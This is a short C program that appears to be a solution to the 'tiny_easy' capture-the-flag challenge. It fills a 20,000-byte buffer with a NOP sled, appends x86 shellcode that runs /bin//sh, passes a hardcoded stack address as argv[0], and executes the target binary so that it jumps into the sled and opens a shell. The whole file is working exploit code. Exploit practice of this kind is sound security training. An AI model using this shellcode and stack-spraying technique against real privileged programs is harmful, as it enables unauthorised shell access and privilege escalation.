#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int
main()
{
    char nop_sled[20021];
    char shellcode[] = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
    memset(nop_sled, 0x90, sizeof(nop_sled));
    memcpy(nop_sled + 20000, shellcode, 21);
    char stack_addr[] = "\x01\x35\xeb\xff";
    char* argv[] = {stack_addr, nop_sled, NULL};

    execve("/home/tiny_easy/tiny_easy", argv, __environ);
    return 0;
}
